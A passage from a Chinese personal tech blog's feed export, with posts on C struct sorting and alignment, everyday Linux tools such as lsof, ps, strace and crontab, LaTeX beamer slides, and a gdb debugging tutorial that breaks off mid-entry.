cpp"><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span> <span class="hljs-params">(*<span class="hljs-keyword">sighandler_t</span>)</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>; <br><span class="hljs-function"><span class="hljs-keyword">sighandler_t</span> <span class="hljs-title">signal</span><span class="hljs-params">(<span class="hljs-keyword">int</span> signum, <span class="hljs-keyword">sighandler_t</span> handler)</span></span>; <br></code></pre></td></tr></table></figure><h1 id="结构体排序的几种方法"><a href="#结构体排序的几种方法" class="headerlink" title="结构体排序的几种方法"></a>结构体排序的几种方法</h1><h2 id="通过重载-lt-操作符"><a href="#通过重载-lt-操作符" class="headerlink" title="通过重载 &lt; 操作符"></a>通过重载 &lt; 操作符</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">int</span> math;<br>    <span class="hljs-keyword">int</span> chinese;<br>    <span class="hljs-keyword">bool</span> <span class="hljs-keyword">operator</span> &lt; (<span class="hljs-keyword">const</span> node &amp;a) <span class="hljs-keyword">const</span><br>    &#123;   <br>    <span class="hljs-keyword">return</span> math&lt;a.math;<span class="hljs-comment">//math从小到大进行排序</span><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="自定义sort的cmp函数"><a href="#自定义sort的cmp函数" class="headerlink" title="自定义sort的cmp函数"></a>自定义sort的cmp函数</h2><p>对于一个结构体而言，有多个关键字，在使用sort的时候可以针对不同关键字进行排序<br>比如下面这个结构体node存储数学和语文成绩</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">int</span> math;<br><span class="hljs-keyword">int</span> chinese;<br>&#125;node[N];<br></code></pre></td></tr></table></figure><p><strong>仅仅以math为关键字进行排序</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">boo <span class="hljs-title">cmp</span><span class="hljs-params">(node a,node b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> a.math&lt;b.math;<span class="hljs-comment">//按照数学成绩从小到大进行排序</span><br>&#125;<br><span class="hljs-built_in">sort</span>(a,a+n,cmp);<br></code></pre></td></tr></table></figure><p><strong>优先以math为关键字排序，当math相等时，以Chinese为关键字排序</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">boo <span class="hljs-title">cmp</span><span class="hljs-params">(node a,node b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(a.math!=b.math) <span class="hljs-keyword">return</span> a.math&lt;b.math;<br><span class="hljs-keyword">if</span>(a.chinese!=b.chinese) <span class="hljs-keyword">return</span> a.chinese&lt;b.chinese;<br>&#125;<br><span class="hljs-built_in">sort</span>(a,a+n,cmp);<br></code></pre></td></tr></table></figure><h1 id="结构体对齐"><a href="#结构体对齐" class="headerlink" title="结构体对齐"></a>结构体对齐</h1><ul><li>原则一:数据成员对齐规则:<ul><li>结构的数据成员，第一个数据成员放在offset为0的地方</li><li>以后每个数据成员存储的起始位置要从该成员大小的整数倍开始(比如int在32位机为4字节，则要从4的整数倍地址开始存储)</li></ul></li><li>原则二:结构体的总大小，也就是sizeof的结果，必须是其内部最大成员的整数倍，不足的要补齐</li><li>原则三:如果一个结构里有某些结构体成员，则结构体成员要从其内部最大元素大小的整数倍地址开始存储<ul><li>struct a里存有struct b，b里有char，int， double等元素， 那b应该从8的整数倍开始存储. </li></ul></li><li>原则四:对齐参数如果比结构体成员的sizeof值小，该成员的偏移量应该以此值为准。也就是说，结构体成员的偏移量应该取二者的最小值<ul><li>对齐参数就是#pragma pack(num)中的num值</li></ul></li></ul><p><img src="/image/image-20230313175216749.png" alt="image-20230313175216749"></p>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux运维常用工具</title>
    <link href="/p/8329f3e9/"/>
    <url>/p/8329f3e9/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/gnulinux.png"></p><h1 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h1><p><a href="https://gls.show/p/66ee2080/">gdb调试：一个简单的入门</a></p><h1 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h1><ul><li>查看程序运行所需的共享库（.so文件）,常用来解决因缺少某个库文件而不能运行的问题</li><li>使用方式：ldd + 文件名</li><li>输出三列，分别是依赖的库、库的位置、库加载的起始地址</li></ul><h1 id="top"><a href="#top" class="headerlink" title="top"></a>top</h1><p>实时显示系统中各个进程的资源占用状况</p><p>交互指令：</p><ul><li>i：只显示正在运行的进程</li><li>h：帮助命令</li><li>q：退出</li><li>u：指定显示用户进程</li><li>P：按%CPU使用率排行</li><li>T：按MITE+排行</li><li>M：按%MEM排行</li><li>c：显示命令完全模式</li><li>s：设置刷新时间间隔</li><li>按键盘数字“1”，可监控每个逻辑CPU的状况</li></ul><p>一些缩写：</p><ul><li>PID：进程的ID</li><li>USER：进程所有者</li><li>PR：进程的优先级别，越小越优先被执行</li><li>VIRT：进程占用的虚拟内存</li><li>RES：进程占用的物理内存</li><li>SHR：进程使用的共享内存</li><li>%CPU：进程占用CPU的使用率</li><li>%MEM：进程使用的物理内存和总内存的百分比</li><li>TIME+：该进程启动后占用的总的CPU时间，即占用CPU使用时间的累加值</li><li>COMMAND：进程启动命令名称</li></ul><p>cpu：</p><ul><li>us 用户空间占用CPU百分比</li><li>sy 内核空间占用CPU百分比</li><li>ni 用户进程空间内改变过优先级的进程占用CPU百分比</li><li>id 空闲CPU百分比</li><li>wa 等待输入输出的CPU时间百分比</li><li>hi 硬件中断</li><li>si 软件中断 </li></ul><h1 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h1><blockquote><p>lsof（list open files）<br>通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等</p></blockquote><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">Lists <span class="hljs-keyword">open</span> files <span class="hljs-keyword">and</span> the corresponding processes.<br> <span class="hljs-literal">Note</span>: Root privileges (<span class="hljs-keyword">or</span> sudo) <span class="hljs-keyword">is</span> required <span class="hljs-keyword">to</span> list files opened by <span class="hljs-keyword">others</span>.<br> More information: https://manned.org/lsof.<br><br> - Find the processes that have a given <span class="hljs-keyword">file</span> <span class="hljs-keyword">open</span>:<br>   lsof path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br> - Find the <span class="hljs-keyword">process</span> that opened a local internet <span class="hljs-keyword">port</span>:<br>   lsof -i :<span class="hljs-keyword">port</span><br><br> - Only output the <span class="hljs-keyword">process</span> ID (PID):<br>   lsof -t path/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">file</span><br><br> - List files opened by the given user:<br>   lsof -u username<br><br> - List files opened by the given command <span class="hljs-keyword">or</span> <span class="hljs-keyword">process</span>:<br>   lsof -c process_or_command_name<br><br> - List files opened by a specific <span class="hljs-keyword">process</span>, given its PID:<br>   lsof -p PID<br><br> - List <span class="hljs-keyword">open</span> files <span class="hljs-keyword">in</span> a directory:<br>   lsof +D path/<span class="hljs-keyword">to</span>/directory<br><br> - Find the <span class="hljs-keyword">process</span> that <span class="hljs-keyword">is</span> listening <span class="hljs-keyword">on</span> a local IPv6 TCP <span class="hljs-keyword">port</span> <span class="hljs-keyword">and</span> don<span class="hljs-symbol">&#x27;t</span> convert network <span class="hljs-keyword">or</span> <span class="hljs-keyword">port</span> numbers:<br>   lsof -i6TCP:<span class="hljs-keyword">port</span> -sTCP:LISTEN -n -P<br></code></pre></td></tr></table></figure><h1 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h1><p>查看进程</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs vim"><br><span class="hljs-keyword">ps</span><br><br>Information about running processes.<br>More information: http<span class="hljs-variable">s:</span>//manned.org/<span class="hljs-keyword">ps</span>.<br><br>- List <span class="hljs-keyword">all</span> running processe<span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">ps</span> aux<br><br>- List <span class="hljs-keyword">all</span> running processes including the full <span class="hljs-keyword">command</span> strin<span class="hljs-variable">g:</span><br>  <span class="hljs-keyword">ps</span> auxww<br><br>- Search <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> process that matches <span class="hljs-keyword">a</span> strin<span class="hljs-variable">g:</span><br>  <span class="hljs-keyword">ps</span> aux | <span class="hljs-keyword">grep</span> <span class="hljs-built_in">string</span><br><br>- List <span class="hljs-keyword">all</span> processes of the current user in extra full forma<span class="hljs-variable">t:</span><br>  <span class="hljs-keyword">ps</span> --user $(id -<span class="hljs-keyword">u</span>) -F<br><br>- List <span class="hljs-keyword">all</span> processes of the current user <span class="hljs-keyword">as</span> <span class="hljs-keyword">a</span> tree:<br>  <span class="hljs-keyword">ps</span> --user $(id -<span class="hljs-keyword">u</span>) <span class="hljs-keyword">f</span><br><br>- Get the parent PID of <span class="hljs-keyword">a</span> proces<span class="hljs-variable">s:</span><br>  <span class="hljs-keyword">ps</span> -<span class="hljs-keyword">o</span> ppid= -<span class="hljs-keyword">p</span> pid<br><br>- Sort processes by memory consumption:<br>  <span class="hljs-keyword">ps</span> --<span class="hljs-keyword">sort</span> size<br></code></pre></td></tr></table></figure><h1 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h1><ul><li>显示每个进程的栈跟踪</li><li>通过sudo apt install pstack进行安装</li></ul><h1 id="strace"><a href="#strace" class="headerlink" title="strace"></a>strace</h1><p>追踪系统调用</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>- Start tracing <span class="hljs-keyword">a</span> specific <span class="hljs-built_in">process</span> <span class="hljs-keyword">by</span> its PID:<br>  strace -p pid<br><br>- Trace <span class="hljs-keyword">a</span> <span class="hljs-built_in">process</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">filter</span> output <span class="hljs-keyword">by</span> <span class="hljs-keyword">system</span> call:<br>  strace -p pid -e system_call_name<br><br>- Count <span class="hljs-built_in">time</span>, calls, <span class="hljs-keyword">and</span> errors <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">system</span> call <span class="hljs-keyword">and</span> report <span class="hljs-keyword">a</span> summary <span class="hljs-keyword">on</span> <span class="hljs-title">program</span> <span class="hljs-title">exit</span>:<br>  strace -p pid -c<br><br>- Show <span class="hljs-keyword">the</span> <span class="hljs-built_in">time</span> spent <span class="hljs-keyword">in</span> every <span class="hljs-keyword">system</span> call:<br>  strace -p pid -T<br><br>- Start tracing <span class="hljs-keyword">a</span> program <span class="hljs-keyword">by</span> executing <span class="hljs-keyword">it</span>:<br>  strace program<br><br>- Start tracing <span class="hljs-built_in">file</span> operations <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> program:<br>  strace -e trace=<span class="hljs-built_in">file</span> program<br></code></pre></td></tr></table></figure><h1 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h1><ul><li>ELF(Executable and Linking Format)</li><li>elf文件的几种类型<ul><li>可重定位的对象文件(Relocatable file)，比如由汇编器汇编生成的 .o 文件</li><li>可执行的对象文件(Executable file)</li><li>动态库文件，.so文件(Shared object file)</li></ul></li></ul><p>readelf指令的几个常用选项：</p><ul><li>-a列出全部</li><li>-h列出文件头</li><li>-S列出段头</li><li>-s符号表</li></ul><h1 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h1><ul><li>直接输入objdump可以显示指令选项，man指令可以更详细一些</li><li>-S 尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数</li><li>-d 反汇编</li><li>-f 显示文件头信息<h1 id="nm"><a href="#nm" class="headerlink" title="nm"></a>nm</h1>nm 命令显示关于指定 File 中符号的信息<h1 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h1></li><li>wget [参数] [URL地址]</li><li>wegt url 从网络下载一个文件并保存在当前目录</li><li>-O选项可以指定文件名</li><li>-c重新启动下载中断的文件</li><li>-b后台下载</li></ul><h1 id="scp"><a href="#scp" class="headerlink" title="scp"></a>scp</h1><p>secure copy，从远程主机处复制<br>常用命令：</p><ul><li>-r 递归复制整个目录</li><li><code>scp path/to/local_file emote_username@remote_host:path/to/remote_directory</code></li><li><code>scp -i ~/.ssh/private_key local_file remote_host:/path/remote_file</code></li></ul><h1 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h1><p>定时任务</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">crontab<br><br>Schedule cron jobs <span class="hljs-built_in">to</span> run <span class="hljs-keyword">on</span> <span class="hljs-title">a</span> <span class="hljs-title">time</span> <span class="hljs-title">interval</span> <span class="hljs-title">for</span> <span class="hljs-title">the</span> <span class="hljs-title">current</span> <span class="hljs-title">user</span>.<br>Job definition <span class="hljs-built_in">format</span>: <span class="hljs-string">&quot;(min) (hour) (day_of_month) (month) (day_of_week) command_to_execute&quot;</span>.<br>More information: <span class="hljs-keyword">https</span>://manned.org/crontab.<br><br>- Edit <span class="hljs-keyword">the</span> crontab <span class="hljs-built_in">file</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> current user:<br>  crontab -e<br><br>- Edit <span class="hljs-keyword">the</span> crontab <span class="hljs-built_in">file</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> specific user:<br>  sudo crontab -e -u user<br><br>- Replace <span class="hljs-keyword">the</span> current crontab <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> contents <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> given <span class="hljs-built_in">file</span>:<br>  crontab path/<span class="hljs-built_in">to</span>/<span class="hljs-built_in">file</span><br><br>- View <span class="hljs-keyword">a</span> list <span class="hljs-keyword">of</span> existing cron jobs <span class="hljs-keyword">for</span> current user:<br>  crontab -l<br><br>- Remove all cron jobs <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> current user:<br>  crontab -r<br><br>- Sample job which runs <span class="hljs-keyword">at</span> <span class="hljs-number">10</span>:<span class="hljs-number">00</span> every day (* means <span class="hljs-keyword">any</span> <span class="hljs-built_in">value</span>):<br>  <span class="hljs-number">0</span> <span class="hljs-number">10</span> * * * command_to_execute<br><br>- Sample job which runs every minute <span class="hljs-keyword">on</span> <span class="hljs-title">the</span> <span class="hljs-title">3rd</span> <span class="hljs-title">of</span> <span class="hljs-title">April</span>:<br>  * * <span class="hljs-number">3</span> Apr * command_to_execute<br><br>- Sample job which runs <span class="hljs-keyword">a</span> certain script <span class="hljs-keyword">at</span> <span class="hljs-number">02</span>:<span class="hljs-number">30</span> every Friday:<br>  <span class="hljs-number">30</span> <span class="hljs-number">2</span> * * Fri /absolute/path/<span class="hljs-built_in">to</span>/script.sh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP：链接</title>
    <link href="/p/e9b29492/"/>
    <url>/p/e9b29492/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，csapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode日常</title>
    <link href="/p/4d5648c6/"/>
    <url>/p/4d5648c6/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于最近实在是太闲了，因此制定了该计划，每天上班做一题leetcode，之后发布题解，然后再开始工作</p><p>刷题顺序一定程度上参照<a href="https://codetop.cc/home">大厂面试频率</a>，由高到低依次进行</p><h1 id="大厂算法hot100题持续更新"><a href="#大厂算法hot100题持续更新" class="headerlink" title="大厂算法hot100题持续更新"></a>大厂算法hot100题持续更新</h1><table><thead><tr><th>原题</th><th>时间</th><th>算法标签</th></tr></thead><tbody><tr><td><a href="https://leetcode.cn/problems/candy/submissions/">分发糖果</a></td><td>2022-6-2</td><td>贪心</td></tr><tr><td><a href="https://leetcode.cn/problems/assign-cookies/">分发饼干</a></td><td>2022-6-2</td><td>贪心</td></tr><tr><td></td><td></td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>leetcode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>leetcode</tag>
      
      <tag>休闲</tag>
      
      <tag>算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>beamer制作slides</title>
    <link href="/p/6c3f01d9/"/>
    <url>/p/6c3f01d9/</url>
    
    <content type="html"><![CDATA[<h1 id="beamer简介"><a href="#beamer简介" class="headerlink" title="beamer简介"></a>beamer简介</h1><p>beamer是LaTeX documentclass的一种，适合制作学术风格PPT，关于LaTeX的介绍可以参考<a href="https://gls.show/p/cc09e53b/">我的另一篇博客</a></p><p>下面是beamer的一个预览图，可以看到还是很简洁美观的</p><p><img src="/image/Beamer-titlepageUpdated.png"></p><h1 id="一个快速入门途径"><a href="#一个快速入门途径" class="headerlink" title="一个快速入门途径"></a>一个快速入门途径</h1><ul><li><p>在GitHub上找一个<a href="https://github.com/SunYanCN/Latex-Beamer-Template">模板</a></p></li><li><p>做填空题即可</p><ul><li>把人名、标题等相关替换掉</li><li>了解一些beamer的基本使用方法</li></ul></li></ul><h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><ul><li>首行是\documentclass[11pt]{beamer}表示字体大小和使用beamer类</li><li>后面是\usepakage表示调用的宏包</li><li>\begin{document}表示文档的开始</li><li>\kaishu表示字体为楷书</li><li>\begin{frame}表示单独一页</li><li>大小关系：section &gt; subsection &gt; frame &gt; item </li></ul><h1 id="图片居中显示"><a href="#图片居中显示" class="headerlink" title="图片居中显示"></a>图片居中显示</h1><p>以居中显示、宽度占60%、高等比例缩放形式展示2.png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;itemize&#125;<br>\centering<br>\includegraphics[width=0.60\textwidth]&#123;pic/2.png&#125;<br>\end&#123;itemize&#125;<br></code></pre></td></tr></table></figure><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ul><li>一级<ul><li>二级<ul><li>三级</li></ul></li></ul></li></ul><p>对应代码：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\begin&#123;itemize&#125;</span><br>       <span class="hljs-string">\item</span> 一级<br>       <span class="hljs-string">\begin&#123;itemize&#125;</span><br>       <span class="hljs-string">\item</span> 二级<br>       <span class="hljs-string">\end&#123;itemize&#125;</span><br>     <span class="hljs-string">\begin&#123;itemize&#125;</span><br>     <span class="hljs-string">\item</span> Mount: 隔离文件系统挂载<br>     <span class="hljs-string">\end&#123;itemize&#125;</span><br><span class="hljs-string">\end&#123;itemize&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/image/LaTeXTest.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs latex">\begin&#123;frame&#125;<br>    \begin&#123;itemize&#125;<br>        \item 容器的共享内核设计<br>        \begin&#123;itemize&#125;<br>        \item 内核变量<br>        \item 数据结构<br>        \item 系统调用<br>        \end&#123;itemize&#125;<br>        \item 容器的安全防御机制<br>     \begin&#123;itemize&#125;<br>     \item namespace<br>     \begin&#123;itemize&#125;<br>     \item Mount: 隔离文件系统挂载点<br>     \item UTS: 隔离主机名和域名信息<br>     \item IPC: 隔离进程间通信<br>     \item PID: 隔离进程的ID<br>     \item Network: 隔离网络资源<br>     \item User: 隔离用户和用户组的ID<br>     \end&#123;itemize&#125;<br>    \item control group<br>    \begin&#123;itemize&#125;<br>    \item CPU<br>    \item 内存<br>    \item IO<br>    \item 存储<br>    \end&#123;itemize&#125;<br>    \end&#123;itemize&#125;<br><br>\end&#123;itemize&#125;<br>\end&#123;frame&#125;<br></code></pre></td></tr></table></figure><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p><a href="https://www.tablesgenerator.com/">tablesgenerator</a></p>]]></content>
    
    
    <categories>
      
      <category>LaTeX</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LaTeX，beamer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gdb调试：一个简单的入门</title>
    <link href="/p/66ee2080/"/>
    <url>/p/66ee2080/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/assembly1.jpeg"><br>问题情景：运行下面程序，得到了错误输出，如何找出错误？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">add_range</span><span class="hljs-params">(<span class="hljs-keyword">int</span> low, <span class="hljs-keyword">int</span> high)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">int</span> i, sum;<br>        <span class="hljs-keyword">for</span> (i = low; i &lt;= high; i++)<br>                sum = sum + i;<br>        <span class="hljs-keyword">return</span> sum;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>        <span class="hljs-keyword">int</span> result[<span class="hljs-number">100</span>];<br>        result[<span class="hljs-number">0</span>] = add_range(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br>        result[<span class="hljs-number">1</span>] = add_range(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result[0]=%d\nresult[1]=%d\n&quot;</span>,result[<span class="hljs-number">0</span>], result[<span class="hljs-number">1</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>用以下命令得到可执行文件main，运行后发现输出了<strong>55、5105</strong>，这显然是错误的，因此需要调试</p><p>编译的时候需要加上-g选项以调试</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">gcc -g hello<span class="hljs-selector-class">.c</span> -o <span class="hljs-selector-tag">main</span><br></code></pre></td></tr></table></figure><blockquote><p>-g选项的作用是在目标文件中加入源代码的信息，比如目标文件中第几条机器指令对应源代码的第几行</p></blockquote><p>命令行输入gdb main进入调试，通过调试发现了下面的错误：</p><ul><li>通过step步入add_range函数，发现前后两次调用函数中sum的值并没有都初始化为0（第二次调用add_range的时候sum的值为55）</li></ul><h1 id="gdb常用的命令"><a href="#gdb常用的命令" class="headerlink" title="gdb常用的命令"></a>gdb常用的命令</h1><ul><li>list<ul><li>输出源代码</li><li>默认从第一行开始列出十行</li><li>可简写为l</li><li>list n 输出第n行前后的代码</li><li>list function_name输出函数function_name前后的代码</li></ul></li><li>提示符下直接敲回车表示重复上一条命令</li><li>quit退出gdb</li><li>run运行程序，当遇到断点后，程序会在断点处停止运行</li><li>next往后执行一句代码</li><li>backtrace查看函数调用的栈帧</li><li>finish命令让程序一直运行到从当前函数返回为止</li><li>p命令可以打印出某个变量的值，包括地址</li><li>set var可以改变变量的值</li><li>backtrace（或bt）查看各级函数调用及参数</li><li>frame + 帧编号选择栈帧</li><li>info（或i） locals查看当前栈帧局部变量的值</li><li>display + 变量名 可以每次停下来的时候自动打印变量的值</li><li>用undisplay可以取消对先前设置的那些变量的跟踪</li><li>info program： 来查看程序的是否在运行，进程号，被暂停的原因</li></ul><h1 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h1><ul><li>break + 函数 可以在某个函数入口处设置断点</li><li>break + 行号 可以在某一行停止</li><li>info breakpoints列出所有断点，缩写：info b</li><li>delete breakpoints删除断点</li><li>disable/enable breakpoints禁用/启用断点</li><li>条件断点<ul><li>break 9 if sum != 0</li><li>如果sum!=0就在第九行打断点</li></ul></li><li>display + 变量名：跟踪查看一个变量，每次停下来都显示它的值</li><li>undisplay取消对先前设置的那些变量的跟踪</li><li>continue（或c）从当前位置开始连续而非单步执行程序，继续执行，到下一个断点处（或运行结束）</li><li>run（或r）从头开始连续而非单步执行程序</li></ul><h1 id="观察点"><a href="#观察点" class="headerlink" title="观察点"></a>观察点</h1><ul><li>断点是当程序<strong>执行到某一代码行时中断</strong>，而观察点是<strong>当程序访问某一存储单元时中断</strong>，如果我们不知道某一存储单元是在哪里被改动的，这时候观察点尤其有用</li><li>用watch命令设置观察点，</li><li>i watchpoints 查看当前设置了哪些观察点</li><li>x 从某个位置开始打印存储器的一段内容，全部当成字节来看，而不区分哪些字节属于哪些变量</li></ul><blockquote><ul><li>x/7b input<ul><li>x命令打印存储器中的内容</li><li>7b是打印格式</li><li>b表示每个字节一组</li><li>7表示打印7组</li></ul></li></ul></blockquote><h1 